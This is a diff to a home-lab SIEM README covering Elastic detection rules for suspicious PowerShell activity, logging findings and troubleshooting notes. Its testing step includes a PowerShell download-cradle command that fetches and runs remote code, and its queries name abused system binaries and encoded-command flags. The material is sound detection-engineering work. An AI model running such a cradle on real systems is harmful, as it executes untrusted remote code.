@@ -81,84 +81,135 @@ event.code: 4625 and winlog.channel: "Security" and winlog.computer_name: "Deskt
 
 ---
 
+### PowerShell Parent-Child Process Detection
+
+**Objective:** Detect processes spawned by PowerShell, indicating potential script-based execution.
+
+**Query (Baseline):**
+```
+event.code: "4688" AND process.parent.name: "powershell.exe"
+```
+
+**Query (High Fidelity):**
+```
+event.code: "4688" AND process.parent.name: "powershell.exe" AND process.name: ("cmd.exe" OR "rundll32.exe" OR "mshta.exe" OR "wscript.exe")
+```
+
+**Key Insight:**
+- Broad detection provides visibility into PowerShell activity
+- High-fidelity detection targets commonly abused binaries (LOLbins)
+
+✅ Successfully triggered alerts using simulated process execution
+
+---
+
+### Encoded PowerShell Command Detection
+
+**Objective:** Detect obfuscated PowerShell execution using encoded commands.
+
+**Query:**
+```
+event.code: "4104" AND powershell.file.script_block_text: ("-enc" OR "-encodedcommand")
+```
+
+**Key Insight:**
+- Encoded commands are commonly used to evade detection
+- Detection depends on Script Block Logging (Event ID 4104)
+
+✅ Successfully triggered alerts using encoded command execution
+
+---
+
+### PowerShell Download Cradle Detection (Fileless Malware)
+
+**Objective:** Detect fileless malware techniques using PowerShell to download and execute remote code in memory.
+
+**Query:**
+```
+event.code: "4104" AND powershell.file.script_block_text: ("IEX" AND "WebClient")
+```
+
+**Testing:**
+```
+IEX (New-Object Net.WebClient).DownloadString("http://example.com")
+```
+
+**Key Insight:**
+- Represents real-world attacker behavior (fileless execution)
+- Executes payloads in memory without writing to disk
+- Relies on Script Block Logging visibility
+
+✅ Successfully triggered alerts through simulated fileless execution
+
+---
+
 ## PowerShell Logging Investigation
 
 ### Objective
-Detect PowerShell usage and command execution.
+Understand differences in PowerShell event logging and improve detection accuracy.
 
 ### Observations
-- Event ID 400 → Captures PowerShell session start (user context, no command content)  
-- Event ID 4104 → Captures script block content (inconsistent visibility)  
+- Event ID 400 → PowerShell session start (no command visibility)  
+- Event ID 4104 → Script Block Logging (captures command content)  
 
 ### Issue
-Detection rules initially triggered on PowerShell session creation rather than actual command execution.
+Initial detections triggered on PowerShell session creation rather than actual command execution.
 
 ### Findings
-- Opening PowerShell does not guarantee visibility into commands  
-- Script Block Logging must be enabled and still may not log all activity  
-- Telemetry gaps can impact detection accuracy  
+- Opening PowerShell does not guarantee command visibility  
+- Script Block Logging must be enabled for useful telemetry  
+- Even with logging, some activity may not be captured consistently  
 
 ### Example Query
 ```
-winlog.computer_name: "DesktopWin11.THE.WIRED" and event.code: (400 or 4104 or 4105 or 4106)
+winlog.computer_name: "DesktopWin11.THE.WIRED" AND event.code: (400 OR 4104 OR 4105 OR 4106)
 ```
 
 ### Lesson
-Detection logic must align with actual telemetry, not assumptions about system behavior.
+Detection engineering must align with **actual telemetry behavior**, not assumptions.
 
 ---
 
 ## Troubleshooting & Problem Solving
 
 ### Issue: Windows Logs Not Appearing in Kibana
-
-**Root Cause:**  
-Fleet output configuration did not match Kibana host settings  
-
-**Resolution:**  
-Aligned Fleet output hosts with Kibana configuration  
+**Root Cause:** Fleet output did not match Kibana host  
+**Resolution:** Corrected configuration  
 
 ---
 
 ### Issue: Kibana Became Inaccessible
-
-**Root Cause:**  
-DHCP IP address change on Ubuntu server  
-
-**Resolution:**  
-Updated configuration to reflect new IP address  
+**Root Cause:** DHCP IP change on Ubuntu server  
+**Resolution:** Updated configuration  
 
 ---
 
-### Issue: Elastic Installation Failed Due to Disk Space
-
-**Root Cause:**  
-Ubuntu VM disk limited to 20GB  
-
-**Resolution:**  
-- Expanded disk to 60GB  
-- Resized partition  
-- Grew filesystem  
+### Issue: Elastic Installation Failed
+**Root Cause:** Insufficient disk space (20GB)  
+**Resolution:** Expanded disk to 60GB and resized filesystem  
 
 ---
 
 ### Issue: Detection Rule Not Triggering
+**Root Cause:** Incorrect data view  
+**Resolution:** Updated to logs-*  
 
-**Root Cause:**  
-Incorrect data view (logs-* not selected)  
+---
 
-**Resolution:**  
-Updated data view configuration in Kibana  
+### Issue: PowerShell Detection Testing Failed Initially
+**Root Cause:** Command executed in incorrect shell context  
+**Resolution:** Re-ran tests in proper PowerShell environment  
 
 ---
 
 ## Key Lessons Learned
 
 - Detection rules must be validated against real telemetry  
-- Similar event IDs can represent very different behaviors (e.g., PowerShell 400 vs 4104)  
-- Misconfigured log pipelines can silently prevent detection  
-- Infrastructure issues (IP changes, disk capacity) directly impact SIEM reliability  
-- Successful detection depends on both data visibility and accurate rule logic  
+- Logging gaps directly impact detection capability  
+- PowerShell event IDs represent different behaviors  
+- Infrastructure issues can silently break detection  
+- Detection engineering requires iterative testing and refinement  
+- Execution context affects testing accuracy  
 
 ---
 
@@ -167,13 +218,13 @@ Updated data view configuration in Kibana
 ✅ SIEM backend operational  
 ✅ Endpoint telemetry ingestion working  
 ✅ Detection rules tested and validated  
+✅ Multiple behavioral detections implemented  
 
 ---
 
 ## Next Steps
 
-- Improve PowerShell detection reliability (focus on Script Block Logging)  
-- Expand telemetry sources (DNS / network logs via Pi-hole)  
-- Correlate endpoint + network activity for advanced detections  
-- Develop additional detection rules (process creation, suspicious commands, etc.)  
-``
+- Improve Script Block Logging reliability  
+- Expand into DNS/network telemetry (Pi-hole integration)  
+- Correlate endpoint and network activity  
+- Tune detection rules to reduce false positives  
